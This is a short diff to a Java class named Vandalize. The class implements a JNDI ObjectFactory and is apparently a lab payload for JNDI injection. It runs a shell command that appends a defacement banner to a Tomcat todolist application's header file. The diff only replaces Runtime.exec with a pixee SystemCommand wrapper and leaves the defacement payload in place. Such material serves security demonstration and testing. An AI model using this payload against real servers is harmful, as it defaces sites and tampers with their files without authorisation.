@@ -1,3 +1,4 @@
+import io.github.pixee.security.SystemCommand;
 import javax.naming.Context;
 import javax.naming.Name;
 import javax.naming.spi.ObjectFactory;
@@ -10,7 +11,7 @@ public class Vandalize implements  ObjectFactory  {
                 "/bin/sh",
                 "-c",
                 "echo '<center><h1>Nice container you have, I think I will move in!</h1></center>' >> /usr/local/tomcat/webapps/todolist/WEB-INF/views/common/header.jspf"};
-        Runtime.getRuntime().exec(cmd);
+        SystemCommand.runCommand(Runtime.getRuntime(), cmd);
         return  null;
     }
 }
